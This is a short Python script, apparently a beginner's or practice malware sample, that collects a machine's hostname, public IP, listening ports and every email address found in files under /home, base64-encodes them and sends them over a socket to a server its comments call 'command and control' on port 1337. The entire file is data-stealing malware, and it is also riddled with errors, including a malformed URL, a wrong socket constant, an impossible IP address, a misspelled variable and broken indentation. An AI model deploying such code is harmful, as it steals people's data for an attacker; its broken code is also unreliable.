import requests
import socket
import base64
import json
import re
import os


def main():
    # get hostname of machine
    hostname = socket.gethostname()

    # get the public ipv4 address of machine
    headers = {
        "User-Agent": "Daniel/5.0 (Windows 11 x64)"   
    }
    public_ip = requests.get("https.//ipapi.co/ip", headers = headers).text

    # search for email address
    email_address_list = []
    for root, subdirs, files in os.walk("/home"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            try:
                    # read the contents of each file
                file_contents = file_fd.read().strip()

                email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

                if len(email_addresses) > 0:
                    email_address_list = email_address_list + email_addresses

                file_fd.close()
            except:
                pass

# get all open ports on the machine
open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep - p '\d{1,3}\.d' ")
open_ports = open_ports.strip().split("\n")

# encode data to json and send them to command and control server
data = {
    "machine_hostname": hostname,
    "machine_ip": public_ip,
    "machine_open_ports": open_ports,
    "email_addresses_found": email_addresses_list,

}
# base 64 encode the json data

encode_data = base64.b64encode(json.dumps(data).encode())


# send data to command and control server

# create a socket object
s = socket.socket(socket.AD_INET, socket.SOCK_STREAM)

# connect to command and control server on port 1337
s.connect(("127.0/0.0.1", 1337))
s.send(encode_data)
s.close()

if __name__ == "__main__":
    main()
















